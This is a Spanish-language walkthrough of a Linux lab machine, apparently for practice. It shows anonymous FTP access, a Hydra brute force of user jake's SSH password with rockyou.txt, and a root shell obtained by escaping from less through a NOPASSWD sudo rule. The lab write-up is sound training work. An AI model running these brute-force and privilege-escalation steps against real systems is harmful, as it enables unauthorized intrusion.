# Brooklyn Nine-Nine

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux aprovechando el acceso anónimo al servicio **FTP**, obtener credenciales válidas para acceder mediante **SSH** y escalar privilegios explotando una mala configuración de **sudo** sobre el binario `less`.

---

## 🛠️ Tecnologías trabajadas

- FTP
- SSH
- Hydra
- Sudo
- GTFOBins
- Less

---

## 🧠 Metodología

La enumeración inicial mostró tres servicios expuestos: **FTP**, **SSH** y **HTTP**. El análisis del servicio FTP reveló que permitía acceso anónimo, por lo que decidí comenzar la investigación por este punto en lugar de centrarme en la aplicación web.

Dentro del servidor FTP encontré un documento que no contenía credenciales directamente, pero sí proporcionaba información muy valiosa sobre varios usuarios del sistema. El contenido sugería que uno de ellos debía cambiar su contraseña, lo que indicaba que probablemente utilizaba una clave débil o fácilmente predecible.

Con esta información realicé un ataque de fuerza bruta dirigido únicamente contra ese usuario, obteniendo acceso al sistema mediante SSH. Posteriormente, la enumeración de privilegios mostró que el usuario podía ejecutar el binario `less` como **root** sin necesidad de contraseña. Consultando **GTFOBins** confirmé que era posible escapar desde `less` hacia una shell privilegiada.

Este laboratorio demuestra cómo una simple fuga de información puede facilitar toda la cadena de ataque y cómo una configuración insegura de `sudo` puede comprometer completamente un sistema.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé identificando los servicios expuestos mediante un escaneo con **ReconX**.

Los puertos abiertos fueron:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

La información más relevante fue:

- El servidor FTP permitía **Anonymous Login**.
- SSH estaba disponible para autenticación.
- La aplicación web no ofrecía información útil para la explotación.

---

### 2. Enumeración del servicio FTP

Accedí al servidor utilizando el acceso anónimo.

```bash
ftp anonymous@10.129.172.92
```

Dentro encontré un documento cuyo contenido hacía referencia a dos usuarios:

- `amy`
- `jake`

El mensaje indicaba que **Jake debía cambiar su contraseña**, lo que sugería que podía estar utilizando una contraseña débil.

Con esta información seleccioné al usuario **jake** como candidato para un ataque de fuerza bruta sobre SSH.

---

### 3. Obtención del acceso inicial

Lancé un ataque utilizando Hydra.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.129.172.92
```

El ataque devolvió las siguientes credenciales:

```
Usuario: jake

Contraseña: 987654321
```

Con ellas inicié sesión mediante SSH.

```bash
ssh jake@10.129.172.92
```

---

### 4. Enumeración interna

Una vez dentro del sistema revisé los directorios de los distintos usuarios.

```bash
ls /home
```

Encontré:

- amy
- holt
- jake

Durante la exploración localicé la primera flag en:

```
/home/holt/user.txt
```

---

### 5. Escalada de privilegios

El siguiente paso fue comprobar los privilegios disponibles mediante `sudo`.

```bash
sudo -l
```

El resultado mostró:

```text
(root) NOPASSWD: /usr/bin/less
```

Consultando **GTFOBins** confirmé que era posible escapar desde `less` hacia una shell.

Abrí un archivo cualquiera como **root**.

```bash
sudo less /etc/hosts
```

Una vez dentro ejecuté:

```text
!/bin/bash
```

El comando abrió una shell heredando los privilegios de **root**.

Verifiqué la escalada.

```bash
whoami
```

Resultado:

```
root
```

Finalmente recuperé la última flag ubicada en:

```
/root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación basada en la combinación de una fuga de información y una configuración insegura de `sudo`.
- Aprovechar el acceso anónimo a un servidor FTP para obtener información sobre usuarios del sistema.
- Interpretar pistas encontradas en documentos para orientar la fase de explotación.
- Realizar ataques de fuerza bruta dirigidos contra un usuario específico utilizando Hydra.
- Enumerar correctamente los privilegios disponibles mediante `sudo -l`.
- Utilizar **GTFOBins** para explotar el binario `less`.
- Comprender cómo determinadas aplicaciones permiten escapar a una shell cuando se ejecutan con privilegios elevados.
### Reflexión

La principal enseñanza de este laboratorio fue comprobar que la información aparentemente inofensiva puede convertirse en un excelente punto de partida para un ataque. Un simple mensaje almacenado en un servidor FTP permitió identificar al usuario más probable para realizar una fuerza bruta con éxito. Posteriormente, una configuración incorrecta de `sudo` sobre el binario `less` permitió obtener acceso como **root** sin necesidad de explotar vulnerabilidades adicionales, reforzando la importancia de revisar cuidadosamente los permisos concedidos a los usuarios del sistema.
